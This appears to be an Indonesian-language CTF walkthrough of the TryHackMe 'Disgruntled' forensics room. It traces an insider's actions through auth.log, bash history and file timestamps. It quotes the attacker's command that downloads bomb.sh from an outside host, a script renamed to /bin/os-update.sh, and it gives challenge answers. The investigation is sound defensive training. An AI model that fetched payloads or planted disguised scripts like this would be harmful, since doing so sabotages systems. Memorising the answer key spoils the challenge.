# Disgruntled
- TryHackMe Challenge: https://tryhackme.com/room/disgruntled
- IP Machine: 10.10.166.127

## Task 1 Introduction
- Akses machine dengan SSH kemudian masukkan password sesuai petunjuk soal
```sh
ssh root@IP_Machine
```

## Task 3 Nothing suspicious... So far
- **Pertanyaan:** The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
- Untuk menemukan jawabannya kita bisa mengecek file **/var/log/auth.log**. Kemudian untuk menginstall package biasanya diikuti kata "install", sehingga kita bisa memfilter log yang mengandung kata "install"
```sh
cat /var/log/auth.log | grep install
```

- **Jawaban:**
```sh
/usr/bin/apt install dokuwiki
```

- **Pertanyaan:** What was the present working directory (PWD) when the previous command was run?
- Tinggal kita lihat nilai PWD di log

- **Jawaban:**
```sh
/home/cybert
```

## Task 4 Let’s see if you did anything bad
- **Pertanyaan:** Which user was created after the package from the previous task was installed?
- Kita bisa menemukan jawabannya di file yang sama. Kemudian kita memfilter yang mengandung kata "adduser"
```sh
cat /var/log/auth.log | grep adduser
```

- **Jawaban:**
```sh
it-admin
```

- **Pertanyaan:** A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
- Kita bisa menemukan jawabannya di file yang sama. Kemudian kita memfilter yang mengandung kata "visudo". Visudo adalah tool digunakan untuk memperbarui atau memodifikasi file sudoers.
```sh
cat /var/log/auth.log | grep visudo
```

- **Jawaban:**
```sh
Dec 28 06:27:34
```

- **Pertanyaan:** A script file was opened using the "vi" text editor. What is the name of this file?
- Kita bisa menemukan jawabannya di file yang sama. Kemudian kita memfilter yang mengandung kata "vi"
```sh
cat /var/log/auth.log | grep vi
```

- **Jawaban:**
```sh
bomb.sh
```

## Task 5 Bomb has been planted. But when and where?
- **Pertanyaan:** What is the command used that created the file `bomb.sh` ?
- Dari pertanyaan Task 4, kita mengetahui bahwa file `bomb.sh` berada di path **/home/it-admin**

- Kemudian kita lihat riwayat perintah di path tersebut dengan bash history
```sh
cat /home/it-admin/.bash_history
```

- **Jawaban:**
```sh
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

- **Pertanyaan:** The file was renamed and moved to a different directory. What is the full path of this file now?
- Dari pertanyaan Task 4, kita mengetahui bahwa penyerang menggunakan vi editor jadi kita bisa mengecek riwayat entry kemudian memfilter riwayat yang mengandung kata "saveas" untuk melacak perubahan nama file
```sh
/bin/os-update.sh
```

- **Pertanyaan:** When was the file from the previous question last modified? (Format: Month Day HH:MM)
- Kita bisa menggunakan ls untuk mengetahui kapan file tersebut dimodifikasi terakhir kali. Namun sayangnya kita tidak dapat mengetahui pukul berapa file tersebut diubah
```sh
ls -la /bin | grep os-update
```

- Kita dapat menggunakan tool date untuk menampilkan detail waktunya
```sh
date -r /bin/os-update.sh
```

- **Jawaban:**
```sh
Dec 28 06:29
```

- **Pertanyaan:** What is the name of the file that will get created when the file from the first question executes?
- Buka file **os-update.sh**
```sh
cat /bin/os-update.sh
```

**Jawaban:**
```sh
goodbye.txt
```